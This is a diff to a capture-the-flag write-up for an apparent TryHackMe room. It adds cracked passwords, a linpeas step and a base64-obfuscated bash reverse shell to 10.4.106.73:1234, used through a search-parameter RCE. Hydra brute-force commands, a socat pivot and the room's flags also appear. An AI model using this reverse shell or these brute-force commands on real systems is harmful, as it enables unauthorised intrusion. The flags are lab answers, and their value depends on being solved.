@@ -12,6 +12,7 @@
 - Identify RCE vulnerability in web application
 - Use SSH tunneling to pivot access
 - Escalate privileges using `sudo` and `PATH` hijack
+- TO find web,user,root flags.
 
 ---
 
@@ -51,6 +52,7 @@ Used `hydra` to brute-force credentials:
 ```bash
 hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.172.81 http-head /
 ```
+and found password: `gunit`.
 
 Logged in as **rascal**.
 
@@ -62,7 +64,7 @@ After login, encountered a "Search System".
 
 Captured request using Burp Suite.  
 Discovered **RCE** in search parameter.  
-Gained reverse shell and found **Web Flag**:
+Gained reverse shell and found **Web Flag** using `echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjEwNi43My8xMjM0IDA+JjEiCg== | base64 -d | bash`:
 ```
 THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
 ```
@@ -71,6 +73,7 @@ THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
 
 ## 🔄 SSH Port Forwarding & Pivot
 
+After running linpeas:
 Discovered local-only SSH on 127.0.0.1:22  
 Used socat to forward:
 ```bash
@@ -81,7 +84,7 @@ Then brute-forced user `fox`:
 ```bash
 hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.172.81:7000
 ```
-
+Found password : `biteme`.
 Logged in via SSH and grabbed **User Flag**:
 ```
 THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
